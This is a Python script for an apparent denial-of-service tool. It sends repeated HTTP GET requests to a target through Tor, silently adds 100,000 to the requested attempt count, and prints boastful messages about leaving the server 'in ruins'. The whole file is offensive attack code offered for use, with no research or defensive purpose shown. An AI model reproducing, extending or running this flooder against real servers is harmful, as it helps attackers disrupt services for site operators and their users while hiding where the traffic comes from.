import datetime
import sys
from lib.color import color
from lib.tor import Tor
from lib.args import parser

def initialize_tor():
    tor = Tor()
    if not tor.tor_installed():
        print('{}[!]{} Tor is not installed. 😡 Exiting...'.format(color.RED, color.END))
        sys.exit(1)
    try:
        tor.init_tor()
        print('{}[!]{} Tor initialized successfully. 🎉'.format(color.BLUE, color.END))
    except Exception as e:
        print('{}[!]{} Error initializing Tor: {}. 😡'.format(color.RED, color.END, e))
        sys.exit(1)
    return tor

def perform_attack(tor, target, max_attempts):
    session = tor.new_session()
    print('\n{}[+]{} Target: {}{}{}. Initiating devastating assault! 💥🔥'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
    print('{}[*]{} Launching full-scale attack on {}. Brace yourself! ⚔️💣'.format(color.ORANGE, color.END, target))
    for attempt in range(1, max_attempts + 1):
        try:
            session.get(target)
            print('{}[*]{} Attempt {}: Attack sent successfully. Destruction imminent! 💀🔥'.format(color.ORANGE, color.END, attempt))
        except Exception as e:
            print('{}[*]{} Attempt {}: Failed to send attack: {}. The target remains resilient! 😡🛡️'.format(color.ORANGE, color.END, attempt, e))
    print('{}[*]{} Attack on {} completed. The server lies in ruins! 💥💀🔥'.format(color.ORANGE, color.END, target))

def calculate_elapsed_time(start_time):
    end_time = datetime.datetime.now()
    total_time = end_time - start_time
    return total_time

def stop_tor_if_running(tor):
    if tor and tor.is_running():
        print('{}[!]{} Stopping Tor... 😡'.format(color.RED, color.END))
        tor.stop_tor()

def main():
    args = parser.parse_args()
    target = args.target
    max_attempts = args.max_attempts
    max_attempts += 100000  # Adding 100,000 to the existing max_attempts
    tor = initialize_tor()

    start_time = datetime.datetime.now()

    try:
        perform_attack(tor, target, max_attempts)

    except KeyboardInterrupt:
        pass
    except Exception as exception:
        print('\n{}[!]{} An error has occurred: {}. 😡'.format(color.RED, color.END, exception))

    finally:
        total_time = calculate_elapsed_time(start_time)
        print('{}[+]{} Time elapsed:\t{}. Tremble before my power! ⏳'.format(color.GREEN, color.END, total_time))
        print('{}[+]{} Number of attempts:\t{}. Prepare for the storm! ⛈️'.format(color.GREEN, color.END, max_attempts))
        stop_tor_if_running(tor)
        print('{}[!]{} Exiting... May chaos reign! 🌀\n'.format(color.RED, color.END))
        sys.exit(0)

if __name__ == '__main__':
    main()
